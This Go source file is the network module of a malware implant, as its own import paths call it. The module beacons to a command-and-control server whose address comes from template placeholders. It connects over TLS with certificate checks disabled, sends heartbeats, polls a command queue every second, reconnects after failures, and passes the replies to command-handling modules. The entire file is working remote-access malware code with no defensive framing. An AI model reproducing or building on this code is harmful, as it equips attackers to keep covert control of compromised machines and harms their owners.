package basic_tcp_network

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"malware/common/messages"
	"malware/implant/included_modules"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/connectivity"
	"google.golang.org/grpc/credentials"
)

type state struct {
	conn    *grpc.ClientConn
	grpc    *grpc.Server
	running bool
}

type settings struct {
	state *state
	host  string
}

func (settings *settings) callback(msg *messages.CheckCmdRequest) {
	client := messages.NewMalwareClient(settings.state.conn)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	client.CheckCommandQueue(ctx, msg)
}

// Initialise connection
func (settings settings) doConnection() {
	client := messages.NewMalwareClient(settings.state.conn)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Send a heartbeat message to ensure connection
	reply, err := client.CheckCommandQueue(ctx, messages.Implant_heartbeat(time.Now().Unix()))
	if err != nil {
		return
	}

	if included_modules.HandleMessage(reply, settings.callback) {
		settings.state.running = false
	}
}

func (settings settings) fixConnection() {
	if settings.state.conn == nil || settings.state.conn.GetState() == connectivity.TransientFailure {
		if settings.state.conn != nil {
			settings.state.conn.Close()
		}

		var clientTLSConfig = &tls.Config{
			InsecureSkipVerify: true,
		}

		conn, err := grpc.Dial(settings.host, grpc.WithTransportCredentials(credentials.NewTLS(clientTLSConfig)))
		if err != nil {
			log.Fatalf("fail to dial: %v", err)
		}
		settings.state.conn = conn
	}
}

func (settings settings) listenServer() {
	settings.state.running = true

	for settings.state.running {
		settings.fixConnection()
		settings.doConnection()

		time.Sleep(1 * time.Second)
	}
	settings.state.conn.Close()
}

func Init() {
	port := int32(_C2_PORT_)
	ip := "_C2_IP_"
	state := &state{}
	host := fmt.Sprintf("%s:%d", ip, port)

	settings := settings{state, host}

	settings.listenServer()
}
